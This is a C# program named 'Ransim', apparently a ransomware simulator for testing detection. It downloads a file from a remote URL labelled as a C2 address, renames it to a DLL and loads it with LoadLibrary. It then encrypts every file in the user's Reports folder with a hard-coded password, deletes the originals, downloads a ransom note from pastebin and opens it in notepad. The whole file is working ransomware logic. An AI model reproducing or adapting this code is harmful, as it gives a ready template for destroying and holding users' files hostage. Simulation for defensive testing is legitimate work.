using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Ransim
{
    class Program
    {
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }
            return data;
        }

        static void FileEncrypt(string inputFile, string password)
        {

            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + ".rsim", FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
            AES.Mode = CipherMode.CFB;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }

        [DllImport("KERNEL32.DLL", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string path);

        static string C2Download(string targetDirPath)
        {
            WebClient client = new WebClient();
            const string c2_url = "https://github.com/d4rk-d4nph3/test/raw/master/cat.jpg";
            string output = targetDirPath + @"\cat.jpg";
            client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
            client.DownloadFile(c2_url, output);
            return output;
        }

        static void RansomNoteDownload(string ransomNote)
        {
            WebClient client = new WebClient();
            const string pastebin_url = "https://pastebin.com/dl/AwQWBWkV";
            client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
            client.Headers.Add("referer", "https://pastebin.com");
            client.DownloadFile(pastebin_url, ransomNote);
        }

        static void Main(string[] args)
        {
            const string targetDir = "Reports";
            const string ransomNote = "ransom_note.txt";
            const string tempDir = "11";
            const string randomPassword = "12345";
            const string newFilename = "crypt0.dll";
            string userDirPath = Environment.GetEnvironmentVariable("USERPROFILE");
            string targetDirPath = userDirPath + @"\" + targetDir;
            string[] files = Directory.GetFiles(targetDirPath, "*");

            string tempDirPath = userDirPath + @"\" + tempDir;
            if (!Directory.Exists(targetDirPath))
            {
                // Precaution
                Console.WriteLine("Reports directory does not exist in USERPROFILE!!");
                Console.WriteLine("Exiting...");
                return;
            }

            Console.WriteLine("Creating temporary directory");
            Directory.CreateDirectory(tempDirPath);

            Console.WriteLine("Downloading Payload DLL");
            string downFile = C2Download(tempDirPath);

            // Rename downloaded file.
            File.Move(downFile, tempDirPath + @"\" + newFilename);
            try
            {
                // Simulating importing of DLL.
                IntPtr hModule = LoadLibrary(tempDirPath + @"\" + newFilename);
                Console.WriteLine("DLL loading successful");
            }
            catch
            {
                Console.WriteLine("Exception Occured during DLL loading.");

            }

            Console.WriteLine("Starting encryption process");
            // Iterate over files in the target directory for encryption.
            foreach (string file in files)
            {
                FileEncrypt(file, randomPassword);
                File.Delete(file);
            }

            Console.WriteLine("Downloading ransom note from pastebin.");
            // Download ransom note from Pastebin.
            RansomNoteDownload(ransomNote);

            // Open notepad to display the ransom note.
            Process.Start("notepad.exe", ransomNote);

            Console.WriteLine("Time for you to check your logs.");
        }
    }
}
